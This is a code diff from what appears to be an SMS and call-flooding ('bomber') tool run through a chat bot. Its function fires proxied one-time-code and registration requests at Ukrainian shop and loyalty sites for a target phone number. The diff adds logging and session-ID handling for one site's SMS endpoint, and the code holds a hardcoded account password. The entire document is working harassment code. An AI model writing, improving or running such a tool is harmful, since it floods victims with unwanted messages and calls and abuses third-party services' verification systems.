@@ -1276,8 +1276,17 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
                     pass
                 kwargs['headers'] = hdrs
                 async with session.request(method, url, **kwargs) as response:
+                    # Спеціальне логування для smaki-maki
+                    if 'smaki-maki.com' in url:
+                        try:
+                            response_text = await response.text()
+                            logging.info(f"smaki-maki відповідь (статус {response.status}): {response_text[:200]}")
+                        except:
+                            pass
                     if response.status == 200:
                         logging.info(f"Успіх - {number}")
+                    elif 'smaki-maki.com' in url:
+                        logging.warning(f"smaki-maki повернув статус {response.status}")
         except asyncio.TimeoutError:
             logging.error(f"Таймаут при запиті до {url}")
         except aiohttp.ClientError as e:
@@ -1340,8 +1349,16 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
         bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, "headers": headers_elmir_call, "cookies": cookies_elmir_call})),
         bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", **with_proxy({"method": 'GET', "headers": headers})),
         bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers})),
-        bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": "", "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
     ]
+    
+    # Додаємо smaki-maki окремо з логуванням
+    if smaki_session_id:
+        logging.info(f"Додаю запит до smaki-maki з OCSESSID: {smaki_session_id[:10]}... та номером: {formatted_number2}")
+        tasks.append(
+            bounded_request("https://smaki-maki.com/index.php?route=extension/module/login_telephone/sms", **with_proxy({"data": {"phone": formatted_number2, "name": "", "passwords": "", "redirect_from": "https://smaki-maki.com/", "show[phone]": "true"}, "headers": headers_smaki, "cookies": smaki_cookies_final}))
+        )
+    else:
+        logging.warning("smaki-maki: не вдалося отримати OCSESSID, пропускаю запит")
 
     if not attack_flags.get(chat_id):
         return
